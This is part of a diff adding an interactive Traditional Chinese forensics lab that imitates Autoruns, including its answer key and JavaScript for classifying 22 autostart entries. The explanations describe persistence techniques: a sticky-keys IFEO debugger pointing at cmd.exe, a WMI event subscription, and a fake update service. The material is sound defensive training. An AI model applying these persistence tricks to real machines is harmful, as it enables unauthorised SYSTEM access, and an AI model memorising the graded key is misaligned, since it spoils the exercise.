+    "15":{bad:0,why:"陷阱題（粉紅色）。未簽署的 .cmd 指令碼、Description 空白，但建立者是 it.admin、建立於半年前、路徑在資訊處自己的工具目錄、觸發時間是合理的夜間備份時段。與第 04 題同一個道理：內部維運腳本長得就是這樣。"},
+    "16":{bad:0,why:"資產監控代理程式的服務，有廠商簽章。"},
+    "17":{bad:0,why:"Windows Defender 的防毒服務。注意它的路徑在 C:\\ProgramData —— 那是五個警訊裡的「奇怪路徑」之一，但這是微軟自己的設計（Defender 平台會自我更新到 ProgramData 底下的版本目錄）。又一個「位置需要留意，不等於有罪」的例子。"},
+    "18":{bad:1,why:"服務名稱 WindowsUpdateSvc 是刻意做出來的近似名 —— 原廠的更新服務叫 wuauserv，系統裡不存在這個名字的服務。影像路徑在使用者的 %TEMP%，未簽署，而且以 LocalSystem 帳戶自動啟動，等於開機就取得最高權限。這裡的檔名 taskhostw.exe 與上午行程樹裡那個 PPID 被偽造的行程是同一個檔案。（T1543.003）"},
+    "19":{bad:0,why:"列印多工緩衝處理器，原廠服務。"},
+    "20":{bad:1,why:"映像劫持（IFEO）。在 sethc.exe 的 Debugger 值指向 cmd.exe：sethc.exe 是相黏鍵協助工具，在<em>登入畫面</em>連按五次 Shift 就會被系統以 SYSTEM 權限啟動 —— 於是任何能碰到這台機器登入畫面的人，不需要密碼就能開出一個 SYSTEM 權限的命令列。整筆資料裡沒有任何一個「壞檔案」，兩個路徑都是有效簽章的微軟程式，Autoruns 顯示白色、且被 Hide Microsoft entries 藏起來。惡意的是<em>這個組合</em>，不是任何一個元件。（T1546.008）"},
+    "21":{bad:0,why:"陷阱題。名字聽起來很嚇人，但這組 WMI 篩選器與取用者隨 Windows 一併安裝，每一台 Windows 都有。看到 WMI 訂閱不要反射性地當成攻擊。"},
+    "22":{bad:1,why:"WMI 事件訂閱持久化。篩選器每 300 秒觸發一次，取用者執行 %TEMP% 底下的 upd.js —— 就是上午樹狀圖最外層那個孤兒 wscript.exe 執行的同一個檔案。這是本實驗最隱蔽的一項：它不在登錄檔的一般自啟動位置，儲存在 WMI 儲存庫裡，工作管理員的「啟動」分頁和 msconfig 都看不到，只有 Autoruns 這類會去讀 root\\subscription 的工具才查得出來。（T1546.003）"}
+  };
+
+  var marks = {}, sel = null, hideMS = true, hideEmpty = false, cat = "all", sortTime = false;
+
+  var $ = function(id){ return document.getElementById(id); };
+  function esc(s){ return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }
+  function byN(n){ for(var i=0;i<E.length;i++){ if(E[i].n===n) return E[i]; } return null; }
+
+  function view(){
+    var l = E.filter(function(e){
+      if(cat !== "all" && e.cat !== cat) return false;
+      if(hideMS && e.ms) return false;
+      if(hideEmpty && e.cls === "yellow") return false;
+      return true;
+    });
+    if(sortTime) l = l.slice().sort(function(a,b){ return a.gts < b.gts ? 1 : -1; });
+    return l;
+  }
+
+  function render(){
+    var tb = $("rows"); tb.innerHTML = "";
+    var list = view(), lastGrp = null;
+
+    list.forEach(function(e){
+      if(!sortTime && e.grp !== lastGrp){
+        lastGrp = e.grp;
+        var g = document.createElement("tr");
+        g.className = "grp";
+        g.innerHTML = '<td colspan="5">' + esc(e.grp) + '</td><td></td>';
+        tb.appendChild(g);
+      }
+      var tr = document.createElement("tr");
+      tr.className = "row " + (e.cls || "") + (sel === e.n ? " sel" : "");
+      tr.tabIndex = 0;
+      tr.setAttribute("data-n", e.n);
+      var tag = marks[e.n] === "f" ? '<span class="tag f">可疑</span>'
+              : marks[e.n] === "c" ? '<span class="tag c">正常</span>' : "";
+      function cell(v){ return v ? esc(v) : '<span class="blank">（空白）</span>'; }
+      tr.innerHTML =
+        '<td><span class="ck">\u2713</span>' + esc(e.name) + '</td>' +
+        '<td>' + cell(e.desc) + '</td>' +
+        '<td>' + cell(e.pub) + '</td>' +
+        '<td class="mono">' + esc(e.img.length > 78 ? e.img.slice(0, 78) + " \u2026" : e.img) + '</td>' +
+        '<td class="mono">' + e.gts + '</td>' +
+        '<td>' + tag + '</td>';
+      tb.appendChild(tr);
+    });
+
+    var f = 0, c = 0;
+    Object.keys(marks).forEach(function(k){ marks[k] === "f" ? f++ : c++; });
+    $("score").textContent = "已標記 " + (f + c) + " / 22　　可疑 " + f + "　　正常 " + c;
+    $("cnt").textContent = "顯示 " + list.length + " / " + E.length + " 筆";
+    $("status").textContent = "Ready.　目前分類：" + cat
+      + "　Hide Microsoft entries：" + (hideMS ? "開" : "關")
+      + "　已隱藏 " + (E.length - list.length) + " 筆";
+    ["btnOpen","btnFlag","btnClear"].forEach(function(id){ $(id).disabled = !sel; });
+  }
+
+  function select(n){
+    sel = n; render();
+    var e = byN(n);
+    $("hint").textContent = "已選取 " + e.name + "。Image Path 欄位是截斷過的，完整的值資料要開 Entry Properties 才看得到。";
+  }
+
+  $("rows").addEventListener("click", function(ev){
+    var tr = ev.target.closest("tr[data-n]"); if(tr) select(tr.getAttribute("data-n"));
+  });
+  $("rows").addEventListener("dblclick", function(ev){
+    var tr = ev.target.closest("tr[data-n]");
+    if(tr){ select(tr.getAttribute("data-n")); openDlg(); }
+  });
+  $("rows").addEventListener("keydown", function(ev){
+    var tr = ev.target.closest("tr[data-n]");
+    if(tr && (ev.key === "Enter" || ev.key === " ")){ ev.preventDefault(); select(tr.getAttribute("data-n")); openDlg(); }
+  });
+
+  $("chkMS").addEventListener("click", function(){
+    hideMS = !hideMS;
+    this.className = "chk" + (hideMS ? " on" : "");
+    $("hint").textContent = hideMS
+      ? "已隱藏所有微軟簽章的項目。清單變短了 —— 但攻擊者如果借用的是有簽章的系統程式，也會一起消失。"
+      : "顯示全部項目。多出來的那幾筆裡，有些不是雜訊。";
+    render();
+  });
+  $("chkEmpty").addEventListener("click", function(){
+    hideEmpty = !hideEmpty;
+    this.className = "chk" + (hideEmpty ? " on" : "");
+    render();
+  });
+
+  Array.prototype.forEach.call(document.querySelectorAll("#tabs .tab"), function(t){
+    t.addEventListener("click", function(){
+      Array.prototype.forEach.call(document.querySelectorAll("#tabs .tab"), function(x){ x.className = "tab"; });
+      t.className = "tab on";
+      cat = t.getAttribute("data-c");
+      render();
+    });
+  });
+
+  $("btnSort").addEventListener("click", function(){
+    sortTime = !sortTime;
+    this.textContent = sortTime ? "還原分類順序" : "依 Timestamp 排序";
+    $("hint").textContent = sortTime
+      ? "最新的在最上面。注意同一個 Run 機碼底下的項目共用一個時間戳 —— 時間告訴你機碼被動過，不會告訴你是哪個值被動的。"
+      : "回到依自啟動位置分組的檢視。";
+    render();
+  });
+  $("btnFlag").addEventListener("click", function(){ marks[sel] = "f"; render(); });
+  $("btnClear").addEventListener("click", function(){ marks[sel] = "c"; render(); });
+
+  /* ---- Entry Properties ---- */
+  function kvrow(k, v, warn){
+    return '<span class="k">' + k + '</span><span class="v' + (warn ? " warn" : "") + '">' + esc(v) + '</span>';
+  }
+  function openDlg(){
+    if(!sel) return;
+    var e = byN(sel);
+    $("dlgTitle").textContent = e.name + " — Entry Properties";
+    var bad = (e.sig || "").indexOf("※") === 0;
+    $("kv").innerHTML =
+      kvrow("自啟動位置", e.grp) +
+      kvrow("項目名稱", e.name) +
+      kvrow("值／設定", e.val) +
+      kvrow("影像路徑", e.img, /Temp|AppData|Users\\Public/i.test(e.img)) +
+      kvrow("Description", e.desc || "（空白）", !e.desc) +
+      kvrow("Publisher", e.pub || "（空白）", !e.pub) +
+      kvrow("檔案大小", e.size) +
+      kvrow("檔案建立時間", e.fts, (e.fts || "").indexOf("2026-04-22") === 0) +
+      kvrow("機碼寫入時間", e.gts, (e.gts || "").indexOf("2026-04-22") === 0) +
+      (e.extra ? kvrow("備註", e.extra) : "");
+    $("outV").className = "out";
+    $("outD").className = "out";
+    $("btnDec").disabled = !/-enc\s+[A-Za-z0-9+/=]{20,}/.test(e.img);
+    $("modal").classList.add("open");
+    $("btnX").focus();
+  }
+  function closeDlg(){ $("modal").classList.remove("open"); }
+
+  $("btnOpen").addEventListener("click", openDlg);
+  $("btnX").addEventListener("click", closeDlg);
+  $("modal").addEventListener("click", function(ev){ if(ev.target === this) closeDlg(); });
+  document.addEventListener("keydown", function(ev){ if(ev.key === "Escape") closeDlg(); });
+
+  $("btnVerify").addEventListener("click", function(){
+    var e = byN(sel), bad = (e.sig || "").indexOf("※") === 0;
+    $("outV").textContent = "簽章驗證結果：" + e.sig
+      + (bad ? "\n（Autoruns 對未簽署或無描述的項目標示粉紅色）" : "");
+    $("outV").className = "out show" + (bad ? " bad" : "");
+  });
+
+  $("btnDec").addEventListener("click", function(){
+    var e = byN(sel), m = e.img.match(/-enc\s+([A-Za-z0-9+/=]{20,})/);
+    if(!m) return;
+    var bin = atob(m[1]), out = "";
+    for(var i = 0; i < bin.length; i += 2){          // PowerShell -enc 使用 UTF-16LE
+      out += String.fromCharCode(bin.charCodeAt(i) | (bin.charCodeAt(i + 1) << 8));
+    }
+    $("outD").textContent = "解碼結果（UTF-16LE）：" + out;
+    $("outD").className = "out show bad";
+  });
+
+  /* ---- 對答案 ---- */
+  $("btnCheck").addEventListener("click", function(){
+    var v = $("verdict"), html = "", right = 0, done = 0;
+    E.forEach(function(e){
+      var mine = marks[e.n], truth = KEY[e.n].bad ? "f" : "c", ok = mine === truth;
+      if(mine) done++;
+      if(ok) right++;
+      html += '<div class="vrow ' + (ok ? "ok" : (mine ? "no" : "")) + '">'
+            + '<span class="vk">' + (mine ? (ok ? "\u2713" : "\u2717") : "\u2013") + " " + e.n + '</span>'
+            + '<span class="vv"><b>' + (KEY[e.n].bad ? "可疑" : "正常") + " " + esc(e.name)
+            + "</b> — " + KEY[e.n].why + '</span></div>';
+    });
+    var head = "<p><b>" + right + " / 22 正確</b>（已作答 " + done + " 筆）。這台主機共有 <b>6 個</b>持久化項目："
+      + "<code>07</code> 亂數檔名的 Run 項、<code>08</code> 借 rundll32 載入 DLL 的 Run 項、"
+      + "<code>09</code> 被附加第二個路徑的 Userinit、<code>14</code> 冒充原廠的排程工作、"
+      + "<code>18</code> 假冒更新服務的自動啟動服務、<code>22</code> WMI 事件訂閱。"
+      + "六個分布在六個不同的位置 —— 這是常態，不是巧合：攻擊者知道你可能會找到一個，所以會多留幾個。</p>"
+      + "<p><b>預設值的代價。</b>其中 <code>08</code>、<code>09</code>、<code>14</code>、<code>20</code> 的簽章者都是 Microsoft，"
+      + "在 Hide Microsoft entries 勾選的預設狀態下<em>全部看不到</em>。（<code>20</code> 是相黏鍵後門，"
+      + "它不召回惡意程式，而是留一道免密碼的 SYSTEM 命令列，性質不同但同屬持久化。）"
+      + "也就是說，照預設值掃一遍只會找到 3 個，漏掉 4 個 —— 而漏掉的那幾個，正好是做得比較細的那幾個。</p>"
+      + "<p><b>五個警訊的失效點。</b>第 08、09、14、20 題五項全部不符合卻是惡意，因為攻擊者用的是<em>有效簽章的系統程式</em>，"
+      + "惡意的是參數與組合；第 04、05、06、15、17、21 題符合一到三項卻是正常，因為內部自製工具沒簽章、"
+      + "每使用者安裝的軟體本來就在 AppData、移除軟體會留下殘骸。"
+      + "五個警訊是很好的<em>排序依據</em>（決定先看哪一個），不是<em>判定依據</em>。</p>";
+    v.innerHTML = "<h2>判讀對照</h2>" + head + html;
+    v.className = "verdict show";
+    v.scrollIntoView({behavior:"smooth",block:"nearest"});
+  });
+
+  render();
+})();
+</script>
+</body>
+</html>
